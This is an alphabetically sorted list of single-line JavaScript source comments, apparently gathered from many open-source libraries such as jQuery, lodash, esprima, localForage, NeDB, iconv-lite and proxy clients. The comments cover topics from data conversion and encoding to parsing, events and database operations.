// Convert other array views to uint8
// Convert our result to an array
// Convert remaining methods.
// Convert response if prev dataType is non-auto and differs from current
// Convert string to CipherParams
// Convert the JavaScript string provided from the user (assumed to be `str` var)
// Convert the input in UCS-2 to Unicode
// Convert the input in UCS-2 to an array of Unicode code points.
// Convert to 32bit integer
// Convert to each sequential dataType
// Convert to pixels if value adjustment is needed
// Convert undefined values to null.
// Converted from big5 work
// Converts a decimal number to hexadecimal
// Converts a hexadecimal number to decimal
// CookieJar configuration:
// Copies a specified amount of bytes from the list of buffered data chunks.
// Copies a specified amount of characters from the list of buffered data
// Copy Safer API
// Copy mapping
// Copy object to make sure that the in param does not get modified between
// Copy one byte at a time
// Copy one word at a time
// Copy options and fill in default values.
// Copy properties from require('buffer')
// Copy sourcesContent into SourceNode
// Copy sourcesContents of applied map.
// Copy static methods from Buffer
// Copy the events from the original to the clone
// Copy the opening '[' or '{'
// Copy the properties one-by-one to the cache object
// Copyright (c) 2005  Tom Wu
// Copyright (c) 2005-2009  Tom Wu
// Copyright (c) 2014-2016 Jonathan Ong me@jongleberry.com and Contributors
// Copyright 2006 Google Inc.
// Copyright 2010-2012 Mikeal Rogers
// Copyright 2011 Mark Cavage <mcavage@gmail.com> All rights reserved.
// Core zlib resets `_handle` to null after attempting to close the
// Correct
// Correct methos
// Couldn't move this check into the 'parseClassMethod' method for backward compatibility.
// Count all documents in the datastore
// Count all of the links from the io.js build page
// Count all planets in the solar system
// Count blocks ready
// Count bytes ready
// Count of children found in the current subtree.
// Count padding bytes
// Count the expected number of properties.
// Count words ready
// Counter for holding the number of active queries
// Counters
// Counts instances of an object that group by a certain criterion. Pass
// Counts of chars in both positions
// Cover grammar support.
// Crash on purpose before rewrite done
// Crazy values should be passed as-is. It is the responsibility of the
// Create DES instances
// Create Literal#value property value.
// Create a (shallow-cloned) duplicate of an object.
// Create a <script> element; its readystatechange event will be fired asynchronously once it is inserted
// Create a deferred object representing the current database operation.
// Create a dummy element so that IE will allow canvas elements to be
// Create a formatted error message.
// Create a local UDP socket for sending packets to the proxy.
// Create a local UDP socket for sending/receiving packets to/from the proxy.
// Create a new _sourcesContents map if the property is null.
// Create a new context for this vm.
// Create a new module (and put it into the cache)
// Create a safe reference to the Underscore object for use below.
// Create a scope stack entry if this is the first node we've encountered in
// Create a sha1 hash of the JS code
// Create a socket connection to the proxy server.
// Create a suped-up `defer` in Node.js.
// Create a temporary object in the required way
// Create a test object that has an overridden `toJSON` property
// Create a timestamp if incoming event doesn't have one
// Create a writable copy of the event object and normalize some properties
// Create an array of initialization states of the related localForages.
// Create an array of readiness of the related localForages.
// Create an in-memory only datastore
// Create and return serializable cipher params
// Create and use Mime instance
// Create bucket on demand.
// Create converters map with lowercased keys
// Create custom iteratee shorthands.
// Create default initializer
// Create dist/test/Utils.jsm
// Create dummy `key` and `ref` property to `props` to warn users
// Create instances of FToC like so:
// Create listener for each media event
// Create mouseenter/leave events using mouseover/out and event-time checks
// Create new node.
// Create our key/value table if it doesn't exist.
// Create padding
// Create padding word
// Create quick reference variables for speed access to core prototypes.
// Create root node.
// Create scrollLeft and scrollTop methods
// Create subkey
// Create the SourceNode.
// Create the abort callback
// Create the array if it doesn't exist
// Create the bridge between the host and the sandbox.
// Create the final options object
// Create the form content. Add Line breaks to the end of data.
// Create toolbar
// Created
// Created lazily.
// Creates a full fledged settings object into target
// Creates a new SocksClient instance.
// Creates instance from buffer with ascii encoding for Strings. 
// Creates instance from buffer with ascii encoding for strings.
// Creates instance from buffer. (Uses default utf8 encoding)
// Creates instance with internal Buffer size of 1024.
// Creates the next connection in the chain.
// Creating SmartBuffer from a string.
// Creating SmartBuffer from existing Buffer
// Creating SmartBuffer with options object. This one specified an existing Buffer.
// Creating SmartBuffer with options object. This one specifies size and encoding.
// Creating SmartBuffer with specified internal Buffer size.
// Creating a binary search tree
// Creating a db file with 150k records (a bit long to load)
// Creating a simple circular object structure
// Cross domain only allowed if supported through XMLHttpRequest
// Cross-browser xml parsing
// Cumulative bit shift constants
// Current character is not part of the sequence.
// Current character will be written too in the next iteration.
// Current version.
// Currently a noop. Will be used to validate and trace mixins.
// Curried with placeholders.
// Curve sequence
// Custom auth method?
// Custom drivers are stored here when `defineDriver()` is called.
// Custom implementation here...
// Custom key comparison function
// Custom types:
// Custom value equality checking function used when we try to just delete one piece of data
// D
// D0 - D7
// D8 - DF
// DB = maskedDB
// DBs created with older versions of localForage will simply not have the blob type.
// DEPRECATED Kept for backwards compatibility until 3.0 in case a plugin uses them
// DEPRECATED: Warning for users of the old Unix Sockets URL Scheme
// DNSSEC generates the public-key on the fly (go calculate it)
// DOM component is still mounted; update
// DOM tree.
// DOM-Level-1-compliant structure
// DOM-Level-1-compliant structure.
// DOMImplementationLSMode
// Data
// Data converters
// Data didn't change
// Data file left untouched
// Data is returned in key order
// Data left unchanged
// Database readiness (promise).
// Datafile only contains index definition
// Date when set
// Date when set; defaulted by Cookie.parse
// Date.now is not available in browsers < IE9
// Dates
// Dates without properties can be shortcutted
// Deanchoring allows embedding independently useful anchored regexes. If you
// Debugging
// Decide the proper request proxy to use based on the request URI object and the
// Decide what async method to use to triggering processing of queued callbacks:
// Decode stream (from binary stream to js strings)
// Decode surrogate
// Decode tables: MBCS -> Unicode.
// Decoded key
// Decoded value
// Decoder chooses automatically from UTF-16LE and UTF-16BE using BOM and space-based heuristic.
// Decoder helpers
// Decoder state
// Decrypt
// Decrypt and XOR
// Deep compare each member.
// Deep compare objects.
// Deep copy.
// Default
// Default abort message
// Default corruptAlertThreshold
// Default jsonp settings
// Default minimum accepted confidence level is 0.20 but sometimes this is not
// Default option for upsert is false
// Default setting for all requests from this agent
// Default speed
// Default state
// Default to 0644
// Default to 0755
// Default to 1 if no count passed or true
// Default to writeOffset if no offset value was given.
// Default value
// Default value-returning functions that may optionally be passed as a
// Defaults to 4096
// Defaults to 5.
// Defaults to `false`.
// Defaults to negotiated value.
// Defaults to utf8
// Defend against cloned attroperties (jQuery gh-1709)
// Deferred helper
// Deferred operations on the database.
// Deferreds
// Define a local copy of jQuery
// Define a type whose name is registered in a namespace (the defCache) so
// Define mime type -> extensions map
// Define the properties of this object.
// Defined already in es6 and babel-core.
// Defines a test case that checks whether getProxyForUrl(input) === expected.
// Defining this global in .jshintrc would create a danger of using the global
// Definitions by: Carlos Ballesteros Velasco <https://github.com/soywiz>
// Definitions by: Wallymathieu <https://github.com/wallymathieu>
// Definitions: https://github.com/DefinitelyTyped/DefinitelyTyped
// Delegate to script
// Delegate to value
// Delegates to **ECMAScript 5**'s native `Object.keys`
// Delegates to **ECMAScript 5**'s native `every` if available.
// Delegates to **ECMAScript 5**'s native `filter` if available.
// Delegates to **ECMAScript 5**'s native `forEach` if available.
// Delegates to **ECMAScript 5**'s native `indexOf` if available.
// Delegates to **ECMAScript 5**'s native `lastIndexOf` if available.
// Delegates to **ECMAScript 5**'s native `map` if available.
// Delegates to **ECMAScript 5**'s native `reduceRight` if available.
// Delegates to **ECMAScript 5**'s native `some` if available.
// Delegates to ECMA5's native Array.isArray
// Delete Header.
// Delete IndexedDB storages (start from scratch)
// Delete a value
// Delete a whole node
// Delete all leaves in a way that makes the tree unbalanced
// Delete headers with value undefined since they break
// Delete leading comments along with any trailing whitespace
// Delete only a value
// Delete only a value (no tree modification)
// Delete the reference from the instance to this internal representation
// Delete the whole node
// Delete trailing comments along with any leading whitespace
// Deletes every item in the table.
// Deleting a field
// Deleting all the data relating to a key
// Deletion
// Denormalize remainder
// Denormalized
// Deprecated old stuff.
// Dequeue a deferred operation.
// Dereference transport for early garbage collection
// DerivationMethods
// Derive key and IV
// Derive key and other params
// Descend through wrappers to the right content
// Description of supported double byte encodings and aliases.
// Deserialize a standard representation
// Deserialize data we've inserted into a value column/field. We place
// Despite the fact that parser.stop() was called whole
// Destroy Socket
// Destrucruting.
// Detach an event or set of events from an element
// Detached nodes confoundingly follow *each other*
// Detect and reject it as soon as possible
// Detect invalid regular expressions.
// Detect silently failing push.apply
// Detect whether the selection is backward.
// Determinant of this.m_ means how much the area is enlarged by the
// Determine handlers
// Determine if at least one element in the object matches a truth test.
// Determine if forward slash (/) is an operator or part of a regular expression
// Determine if have config object in the call.
// Determine if request has content
// Determine if successful
// Determine if the array or object contains a given value (using `===`).
// Determine if the context has changed or not
// Determine if version is greater than all the versions possible in the range.
// Determine if version is less than all the versions possible in the range
// Determine the object type
// Determine the pixel offset; use the default if not available
// Determine the position of an element within the set
// Determine what is o.
// Determine whether all of the elements match a truth test.
// Determine whether in memory or persistent
// Determine whether item is loose or not.
// Determine whether the next list item belongs here.
// Devices and FIFOs aren't fully supported
// Didn't do it for now because no encoding has this situation yet.
// Differences:
// Different environments stringify it differently
// Different parsing options should give the same error.
// Differs from JSON.stringify in that undefined because undefined and that
// Digit conversions
// Direct alias to other encoding.
// Direct character or '&'.
// Direct connection to the destination endpoint
// Direct request.
// Directory        d----
// Disable .fire
// Disable .fire and .add
// Disabled?
// Disables additional syntax and flag extensions
// Disallow defining methods more than once unless explicitly allowed.
// Disallow overriding of base class methods unless explicitly allowed.
// Disambiguating between a `for` and a `for`/`in` or `for`/`of`
// Discard index placeholder values to get only actual matches
// Discard the second event of a jQuery.event.trigger() and
// Disconnected nodes
// Discussions and reference: http://philrathe.com/articles/equiv
// Distinguish between a props update versus a simple state update
// Do NOT use this to enforce a certain condition on any user input.
// Do a sibling check if the nodes have a common ancestor
// Do more stuff with 'body' here
// Do not add duplicate elements to the set
// Do not allow nested parentheses on the LHS of the =>.
// Do not cache `Buffer.isEncoding` when checking encoding names as some
// Do not descend into nested loops.
// Do not follow redirects
// Do not include comment or processing instruction nodes
// Do not save awaitIdentPos to allow checking awaits nested in parameters
// Do not set `select.value` as exact behavior isn't consistent across all
// Do not transform from
// Do not traverse comment nodes
// Do nothing for window-less documents.
// Do nothing special with <script> tags.
// Do nothing with the error which is only there to test we stay on track
// Do other things once the value has been saved.
// Do send the request (this may raise an exception)
// Do some typechecking here since we call this blindly. We want to ensure
// Do something
// Do something with `res`...
// Do stuff
// Do stuff here.
// Do the actual projection
// Do the same for pointerenter/pointerleave and pointerover/pointerout
// Do this the easy way :-)
// Do work to process file here
// Docs are not indexed
// Document context
// Document order sorting
// Document replacement
// DocumentFragment nodes don't have gEBTN
// DocumentFragments aren't actually part of the DOM after insertion so
// DocumentType must be implicitly adopted
// Does Not Delete Itself.
// Does a simple `COUNT(key)` to get the number of items stored in
// Does it contain a term with double-negative meaning?
// Doesn't matter what the args are here.
// Doesn't work in IE < 9
// Doing so also fixes numerous browser bugs in the native methods
// Don&#39;t do either of these:
// Don't add duplicates
// Don't allow unknown flags (true by default).
// Don't attach events to noData or text/comment nodes (but allow plain objects)
// Don't bring in undefined values
// Don't check non-elements (#13208)
// Don't conflict with Object.prototype properties (#13203)
// Don't consume trailing commas as valid
// Don't do anything here. During the server rendering we don't want to
// Don't do anything if add isn't an object
// Don't do either of these:
// Don't do events on text and comment nodes
// Don't emulate named getters for these properties.
// Don't fire events if jQuery.event is undefined in an AMD-usage scenario (#15118)
// Don't fire the event while the user is dragging. This matches the
// Don't get fooled by Object.prototype properties (jQuery #13807)
// Don't have enough
// Don't keep the element (issue #299)
// Don't match elem in the :animated selector
// Don't need to check for '{' and '}' as it's already handled
// Don't overwrite existing Cookie header
// Don't overwrite numeric indices with named ones.
// Don't pass non-elements to Sizzle
// Don't proxy URLs that match NO_PROXY.
// Don't proxy URLs without a valid scheme or host.
// Don't raise the hwm > 128MB
// Don't raise the hwm > 1GB
// Don't raise the hwm > 8MB
// Don't re-trigger an onFOO event when we call its FOO() method
// Don't return options that are disabled or in a disabled optgroup
// Don't set styles on text and comment nodes
// Don't store the `typeof` result in a variable to avoid a JIT bug in Safari 9.
// Don't try to save users less than 1.2ms (a number I made up)
// Don't use 'blue' not visible on cmd.exe
// Don't use UCS-2
// Don't use UCS-2.
// Don't use test/exec because they would update lastIndex
// Don't wait for itself...
// Dot notation with index in the middle
// Double Floating Point
// Double check webkit in userAgent just in case we are in a worker
// Double lead surrogate found.
// Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=
// Drop
// Drop :port suffix from Host header if known protocol.
// Duck type TopLevelWrapper. This is probably always true.
// Due to https://bugzilla.mozilla.org/show_bug.cgi?id=883468 position of expr.body can differ in Spidermonkey and ES6
// Duplicate selection so we can move range without breaking user selection.
// Duplicate the `names` array since it's rude to augment the user args
// During componentWillMount and render this will still be null but after
// E + F
// E + F (F adiacent sibling of E)
// E > F
// E > F (F children of E)
// E F
// E F (E ancestor of F)
// E ~ F
// E ~ F (F relative sibling of E)
// E.g. _attrModified (which maybe should be split into its per-spec variants)
// E.g. the one here was generated using this modules `uuid` CLI.
// E0 - E7
// E8 - EF
// ECCurveFp
// ECFieldElementFp
// ECMA-262 11.2 White Space
// ECMA-262 11.3 Line Terminators
// ECMA-262 11.4 Comments
// ECMA-262 11.6 Identifier Names and Identifiers
// ECMA-262 11.6 Names and Keywords
// ECMA-262 11.6.2.1 Keywords
// ECMA-262 11.6.2.2 Future Reserved Words
// ECMA-262 11.7 Punctuators
// ECMA-262 11.8.3 Numeric Literals
// ECMA-262 11.8.4 String Literals
// ECMA-262 11.8.5 Regular Expression Literals
// ECMA-262 11.8.6 Template Literal Lexical Components
// ECMA-262 12.10 Relational Operators
// ECMA-262 12.11 Equality Operators
// ECMA-262 12.12 Binary Bitwise Operators
// ECMA-262 12.13 Binary Logical Operators
// ECMA-262 12.14 Conditional Operator
// ECMA-262 12.15 Assignment Operators
// ECMA-262 12.16 Comma Operator
// ECMA-262 12.2 Primary Expressions
// ECMA-262 12.2.1
// ECMA-262 12.2.10 The Grouping Operator
// ECMA-262 12.2.5 Array Initializer
// ECMA-262 12.2.6 Object Initializer
// ECMA-262 12.2.9 Template Literals
// ECMA-262 12.3 Left-Hand-Side Expressions
// ECMA-262 12.4 Update Expressions
// ECMA-262 12.5 Unary Operators
// ECMA-262 12.6 Exponentiation Operators
// ECMA-262 12.7 Multiplicative Operators
// ECMA-262 12.8 Additive Operators
// ECMA-262 12.9 Bitwise Shift Operators
// ECMA-262 13 Statements
// ECMA-262 13.10 The return statement
// ECMA-262 13.11 The with statement
// ECMA-262 13.12 The switch statement
// ECMA-262 13.13 Labelled Statements
// ECMA-262 13.14 The throw statement
// ECMA-262 13.15 The try statement
// ECMA-262 13.16 The debugger statement
// ECMA-262 13.2 Block
// ECMA-262 13.3.1 Let and Const Declarations
// ECMA-262 13.3.2 Variable Statement
// ECMA-262 13.3.3 Destructuring Binding Patterns
// ECMA-262 13.4 Empty Statement
// ECMA-262 13.5 Expression Statement
// ECMA-262 13.6 If statement
// ECMA-262 13.7.2 The do-while Statement
// ECMA-262 13.7.3 The while Statement
// ECMA-262 13.7.4 The for Statement
// ECMA-262 13.7.5 The for-in and for-of Statements
// ECMA-262 13.8 The continue statement
// ECMA-262 13.9 The break statement
// ECMA-262 14.1 Function Definition
// ECMA-262 14.1.1 Directive Prologues
// ECMA-262 14.2 Arrow Function Definitions
// ECMA-262 14.3 Method Definitions
// ECMA-262 14.4 Generator Function Definitions
// ECMA-262 14.5 Class Definitions
// ECMA-262 15.1 Scripts
// ECMA-262 15.2 Modules
// ECMA-262 15.2.2 Imports
// ECMA-262 15.2.3 Exports
// ECMA-262 7.8.5
// ECMAScript 5.1/Unicode v7.0.0 NonAsciiIdentifierPart:
// ECMAScript 5.1/Unicode v7.0.0 NonAsciiIdentifierStart:
// ECMAScript 6/Unicode v7.0.0 NonAsciiIdentifierPart:
// ECMAScript 6/Unicode v7.0.0 NonAsciiIdentifierStart:
// ECParameters
// ECParameters sequence
// ECPointFp
// EF BB BF  UTF-8 with BOM
// END PACKAGE_IMPORTS_RESOLVE
// ENOSYS means that the fs doesn't support the op. Just ignore
// EOF
// EOF and Punctuator tokens are already filtered out.
// ES.next draf 11.13 Runtime Semantics step 1
// ES3/ES5 implementation of the Krhonos Typed Array Specification
// ES5: lock down object properties
// ES6 JavaScript
// ES6 symbol
// ES6: 15.2.1 valid import declarations:
// ESTree requires null if it failed to instantiate RegExp object.
// ESTree/Acorn/ESpree use .local for all three node types.
// EUC-JP
// EUC-KR
// EUC-TW
// EUCTW frequency table
// Each Hit object has a reference to its Yallist.Node.  This
// Each TypedArray type requires a distinct constructor instance with
// Each element has two properties: 'declared' and 'used'.
// Each line is added as separate string.
// Each object in the arrays is of the form:"
// Each scope gets a bitset that may contain these flags
// Early error if compiler can't be found.
// Early error if sandbox is not an object.
// Early error:
// Easier return values.
// Easily-parseable/retrievable ID or TAG or CLASS selectors
// Easy API for creating new setFilters
// Eating the stack.
// Edge cases
// Either no match is found and the function will return from within the loop
// Element contains another
// Element context
// Element/input types
// Else call normal init
// Emit all buffered events and resume underlaying source
// Emit removeListener for all listeners on all events
// Empty arrays are not changed
// Empty stub; may be reassigned or overridden by subclasses.
// Empty the queue first
// Empty tree
// Enable deletion.
// Enable finishing flag on private data
// Enable living standard features
// Enables extensibility of XRegExp syntax and flags
// Encode tables: Unicode -> DBCS.
// Encoded key
// Encoded value
// Encoder helpers
// Encoder is mostly trivial
// Encoder state
// Encoder uses UTF-16LE and prepends BOM (which can be overridden with addBOM: false).
// Encoders
// Encoding buffer.
// Encodings
// Encountered nothing but spaces.
// Encrypt
// End of '$addToSet modifier'
// End of '$inc modifier'
// End of '$pop modifier'
// End of '$pull modifier'
// End of '$push modifier'
// End of '$set modifier'
// End of '$unset modifier'
// End of fs modification
// End of media/supports/document rule.
// End of options marker.
// End the most recent filtering operation in the current chain and return the
// Enforce case-sensitivity of name attribute
// Enforce single-firing
// Enough space to store all bytes of a single character. UTF-8 needs 4
// Enqueue the base names of this type.
// Enqueue the deferred operation.
// Ensure `LazyWrapper` is an instance of `baseLodash`.
// Ensure `args[args.length - 1]` will be a string when given nonstring `this`
// Ensure `batchLog` is invoked once after 1 second of debounced calls.
// Ensure a hooks for this queue
// Ensure buffer.
// Ensure consistency between cache and reality.
// Ensure enough capacity to write data.
// Ensure readable listeners eventually get something
// Ensure string.
// Ensure that both objects contain the same number of properties.
// Ensure that we restore the object as it was.
// Ensure the complete handler is called before this completes
// Ensure the created nodes are orphaned (#12392)
// Ensure the loop is entered when path is empty.
// Ensure the sign of `-0` is preserved.
// Ensure there is enough internal Buffer capacity.
// Ensure there is enough internal Buffer capacity. (raw offset is passed)
// Ensure trailing `$` isn't escaped
// Ensure wrappers are instances of `baseLodash`.
// Ensures identical properties name
// Ensuring the state is clean
// Entry iterators provide implicit keys.
// Env-specific initialization logic for debug instances
// Equal to ['some data for key 15']
// Equal to []
// Equality is deep-checked (i.e. $addToSet will not insert an object in an array already containing the same object)
// Equivalent of `typeof` but with special handling for array and regexp.
// Error codes and messages."
// Error messages should be identical to V8.
// Error: ... does not type check...
// Errors (both immediate and async write errors) can be detected in an optional
// Errors in window-less documents just get swallowed... can you think of anything better?
// Escape characters that can't be included in string literals.
// Especially useful on the arguments object. Passing an **n** will return
// Esprima block comment.
// Esprima deviation.
// Esprima line comment.
// Esprima used to use the .name field to refer to the local
// Establish the object that gets returned to break out of a loop iteration.
// Estimate quotient digit
// Evaluate executable scripts on first document insertion
// Evaluate text as a json expression
// Evaluates a script in a global context
// Even after a reload the database state hasn't changed
// Even if the user accepts the prompt to use
// Even though partialFunExpr doesn't actually contain all the fields that
// Even without specifying a file name to the VMScript object.
// Event object
// Event queue being processed in the same cycle allows
// Event type
// EventEmitter is defined in src/node_events.cc
// EventEmitter throws an exception
// EventEmitter.prototype.emit() is also defined there.
// Events and their corresponding property names.
// Events are not possible without cancelling IME.
// Events bubbling up the document may have been marked as prevented
// Every PathVisitor has a different this.Context constructor and
// Every written chunk gets output as-is.
// Everything else works just like normal...
// Everything that references the open() function needs to be in here
// Exact
// Example:"
// Examples:
// Exclude leading and trailing slash.
// Exclude object elements
// Exclude scripts to avoid IE 'Permission Denied' errors
// Excluded if messages set to false.
// Execute a callback for every element in the matched set.
// Execute immediately if ready is not present
// Execute the appropriate callbacks
// Execute the module function
// Executes visitor on the object and its children (recursively).
// Executing both pixelPosition & boxSizingReliable tests require only one layout
// Existing buffer code will continue to work without issues:
// Existing node.
// Exit early for strings to avoid a performance hit in some environments.
// Exit early if metadata can't be merged.
// Exit early if the nodes are identical
// Exit the iteration early:
// Exits successfully and prints matching version(s) if
// Expand context for sibling selectors
// Expand the .loc of the node responsible for printing the decorators
// Expands a list of Unicode code points and ranges to be usable in a regex character class
// Expect IME keyCode on each keydown. If we get any other
// Expect the config values to be as they were before.
// Expect the next JSX token to match the specified punctuator.
// Expect the next token to match the specified contextual keyword.
// Expect the next token to match the specified keyword.
// Expect the next token to match the specified punctuator.
// ExperimentalWarning before fs.promises is actually accessed.
// Explicit key
// Export Node.js internal encodings.
// Export all keys:
// Export declarations are responsible for printing any decorators
// Export extra methods:
// Export for CommonJS support.
// Export for Node.js.
// Export for testing
// Export fs.promises as a getter property so that we don't trigger
// Export lodash.
// Export promiseified graceful-fs:
// Export the parseFoo parsers because they might be useful as primitives
// Export to the global object.
// Exports
// Expose Lodash on the global object to prevent errors when Lodash is
// Expose `MapCache`.
// Expose support vars for convenience
// Expose the Barrett function
// Expose the partially-built object to the default
// Expose the type on the factory and the prototype so that it can be
// Exposed for instanceof checks. The fromString function should be used
// ExpressionStatements where a Statement was expected.
// Expressions.
// Extend a given object with all the properties in passed-in object(s).
// Extend jQuery itself if only one argument is passed
// Extend message
// Extend the base object
// Extended information mode with valueNames
// Extending ajaxSettings
// Extension from an expression
// Extract anything that could conceivably be a part of a valid semver
// Extract bytes
// Extract dataTypes list
// Extract entropy (256 bits) from NS4 RNG if available
// Extract error from statusText and normalize for non-aborts
// Extract every other digit from a string using XRegExp.forEach
// Extract salt
// Extracted because @types/node doesn't export interfaces.
// Extracts every other digit from a string
// Extracts only enough buffered data to satisfy the amount requested.
// Extracts the result from a wrapped and chained object.
// F0 - F7
// F8 - FF
// FF / Opera do not add the message
// FF 3.5 - :enabled/:disabled and hidden elements (hidden elements are still enabled)
// FIXME Hack to have stream not keep the event loop alive.
// FIXME Should probably have an option in net.Socket to create a
// FIXME drop these node types in next major version
// FIXME recursively check contents
// FIXME wrong class structure
// FIXME: what if this '{' is in the url text of the match function?
// F_ALLOW_CALL
// F_ALLOW_CALL becomes false.
// F_ALLOW_IN
// F_ALLOW_IN becomes false.
// F_ALLOW_UNPARATH_NEW
// F_ALLOW_UNPARATH_NEW becomes false.
// F_ALLOW_UNPARATH_NEW may become false.
// F_DIRECTIVE_CTX
// F_FUNC_BODY
// F_SEMICOLON_OPT
// Failed
// Failed to establish proxy connection to destination.
// Failing update
// Fails silently when not in strict mode.
// Fails to persist the checked state of a cloned checkbox or radio button.
// Fails to return the selected option to the default selected state when cloning options
// Failure: using both modes at the same time
// Fake xhr
// Fall back to computed then uncomputed css if necessary
// Fall back to fs.chown in those cases.
// Fall back to the DOM Level 1 API.
// Fallback to `wheelDeltaX` for Webkit and normalize (right is positive).
// Fallback to `wheelDeltaY` for Webkit and normalize (down is positive).
// Fallback to `wheelDelta` for IE<9 and normalize (down is positive).
// Fallback to prop when attributes are not supported
// Fallback to seeking `elem` from the start
// False by default until .build(...) is called on an instance.
// Fast path for a common property of AST nodes.
// Feature detection; only IE8 is known to behave improperly like this.
// Feel free to add to or remove from this list of extension modules to
// Feel free to send PRs updating them!
// Feistel function
// Fetch a blob using ajax. This reveals bugs in Chrome < 43.
// Fetch a seed set for right-to-left matching
// Fetch google.com content and obtain it's <body> node
// FieldID sequence
// Figure out dimensions so we can do gradient fills
// Figure out if it's a module code.
// Figure out if one of the last i bytes of our buffer announces an
// Figure out if we're running the tests from a server or not
// FileReader bug: https://code.google.com/p/chromium/issues/detail?id=447836
// Fill cached database (i.e. all indexes) with data
// Fill in a given object with default properties.
// Fill the buffer with octets of 0
// Fill the string into a ArrayBuffer.
// Filter if we have selector
// Filter out padding
// Filter out possible comments
// Filter out properties that are functions and are reserved.
// Filter out properties that are not reserved.
// Filters
// Final data update
// Final letter analysis for logical-visual decision.
// Final message update
// Final permutation
// Final reduce to clean-up the stack.
// Finalize
// Find all documents in the collection
// Find delegate handlers
// Find primary matches
// Find rule for a given domain."
// Find the current active section every scroll tick.
// Find the first line that matches; important for multi-line messages
// Find the innermost node of a given type that contains the given
// Find the last child that has been added to the document.
// Find the next relative operator (if any) for proper handling
// Find the outermost matching node after a given position.
// Find the outermost matching node before a given position.
// Find the parent
// Find the right-most coercible string that does not share
// Find the section containing the generated position we're trying to map
// Find the set of versions that are allowed to have prereleases
// Find the top offsets of each section
// Finding all inhabited planets in the solar system
// Finding all planets in the solar system
// Finding all planets whose name contain the substring 'ar' using a regular expression
// Finding documents
// Finding generated positions
// Finding original positions
// Finish
// Finish early in limited (non-browser) environments
// Finish node at given position
// Finish the basic string - if it is not empty - with a delimiter
// Finish the basic string with a delimiter unless it's empty.
// Finished
// Fire 'error' event.
// Fire callbacks
// Fire handlers on the event path
// Fire native event if possible so blur/focus sequence is correct
// FireFox implements `key` but returns `MozPrintableKey` for all
// FireFox/Opera/Safari/KHTML have support for Mutation Events
// Firefox 11- do not support outerHTML
// Firefox creates a click event on right mouse clicks. This removes the
// Firefox creates a keypress event for function keys too. This removes
// Firefox does not have the issue with devtools loaded over file://
// Firefox doesn't alert if the returnValue field is not set.
// Firefox doesn't have focus(in | out) events
// Firefox needs to capture a different mouse scroll event.
// Firefox/Chrome experimental implementations
// First character of the reprinted node.
// First check if devtools is not installed
// First check if there is a new line in between.
// First chunk is a perfect match.
// First element of chunk is the hex mbcs code where we start.
// First paragraph of: http://www.cs.bgu.ac.il/~elad/noa_v.html
// First pass is to find the `function` nodes and turn them into async or
// First set: no rebalancing necessary
// First we need to exclude the opening ` from the .loc of the first
// Fix IE cloning issues
// Fix browsers that increment `lastIndex` after zero-length matches
// Fix browsers whose `exec` methods don't consistently return `undefined` for
// Fix https://github.com/AntSwordProject/antSword/issues/229
// Fix it when node fixes it.
// Fix name and attach hooks
// Fixes #9887
// Fixes IE bug
// Fixes an `Array#sort` bug in the JS engine embedded in Adobe applications
// Fixes buffer unsafe allocation
// Fixes bug #9237
// Flag for duplicate removal
// Flag the module as loaded
// Flag to know if list is currently firing
// Flag to know if list was already fired
// Flag to prevent firing
// Flag y controlled internally
// Flags gy not needed here; flags nsx handled by XRegExp
// Flash Player and SWF version mismatch or an older Webkit engine that ignores the HTML object element's nested param elements: display alternative content instead of SWF
// Flatten any nested arrays
// Flatten children and warn if they aren't strings or numbers;
// Flip if necessary
// Floating Point
// Flow
// Follow flag g when `scope` isn't explicit
// Foo Tag (case insensitive)
// For CommonJS enviroments
// For IE8 and IE9.
// For RegExp validation
// For Safety. Some additional errors might fire later on
// For SyntaxError in https://www.ecma-international.org/ecma-262/8.0/#sec-atomescape
// For UTF-16LE we do not explicitly append special replacement characters if we
// For `<object />` acts as `src`.
// For `PacResolver`
// For a $in match
// For a basic match
// For a comparison match
// For backwards compat only
// For backwards-compatibility buffering default is ad-hoc MIME-dependent
// For cases like 'first argument'
// For chaining.
// For delete proto[name].
// For details on all this junk:
// For discoverability.
// For each dataType in the dataTypeExpression
// For easier finding
// For events like 'submit' which don't consistently bubble (which we trap at a
// For example: https://github.com/Polymer/polymer-bundler/pull/519
// For internal usage only
// For internal use only.
// For legacy support
// For mouseenter/leave call the handler if related is outside the target.
// For now everything else is undefined. We should probably throw an error instead
// For now when you opt-in to autoDestroy we allow
// For options that shouldn't be deep extended:
// For reference:
// For supporting legacy API we put the FD here.
// For test cases: https://mathiasbynens.be/demo/url-regex
// For testing
// For the source: https://gist.github.com/dperini/729294
// For this test only we have to use objects with _ids as the array version of getMatching
// For use in libraries implementing .is()
// For validating existence
// Force WebSQL; same as using setDriver()
// Force browsers to behave consistently when non-matching value is set
// Force callback invocation
// Force domain to lowercase.
// Force json dataType
// Force localStorage to be the backend driver.
// Force options to be an object
// Force write by chunks of 5000 bytes to ensure data will be incomplete on crash
// Forcing localstorage here. Feel free to switch to other drivers :)
// Forget the data if we're done with it
// Forgot a callback but don't know where? Use NODE_DEBUG=fs
// Form
// Format
// Format of the error message when the unique constraint is not met
// Found the element we are looking for.
// Found. Write it.
// Four main charsets exist in Hebrew:"
// Four or more are not supported for CESU-8.
// Frame code as the function body.
// From RFC6265 S4.1.1
// From http://stackoverflow.com/questions/14967647/ (continues on next line)
// From internal representation to an external structure
// From wikipedia:"
// Function (ahem) Functions
// Function as sole body of either an if statement or a labeled statement
// Function declaration
// Function expressions don't get their names (if there is one) added to
// Function signature can be
// Function support
// Function#name is not settable on some platforms (#270)
// FunctionTypeAnnotation is ambiguous:
// Functional tests.
// Functions for escaping and unescaping strings to/from HTML interpolation.
// Functions were used because (among other reasons) that's the most
// Functions without properties can be shortcutted.
// Fuzzy
// GB18030 is an algorithmic extension of GBK.
// GB2312
// GB2312 most frequently used character table
// GBK (~22000 chars) is an extension of CP936 that added user-mapped chars and some other.
// GETTERS
// Gamma0
// Gamma1
// Gather template data.
// General behaviour is tested in the block about $lt. Here we just test operators work
// General ideas of the Hebrew charset recognition //////
// General objects (check for deep equality)
// General-purpose constants
// Generate a function of recursive functions that can be used to check each element
// Generate a unique integer id (unique within the entire client session).
// Generate an integer Array containing an arithmetic progression. A port of
// Generate four keystream words
// Generate four subvectors
// Generate initial counter values
// Generate initial state values
// Generate key
// Generate keystream
// Generate keystream word
// Generate parameters to create a standard animation
// Generate random salt
// Generate shortcuts for custom animations
// Generate two ids in an array
// Generate valid RegExp expression.
// Generated by CoffeeScript 1.12.2
// Generated by CoffeeScript 1.12.7
// Generated by LiveScript 1.2.0
// Generated by LiveScript 1.4.0
// Generated by LiveScript 1.5.0
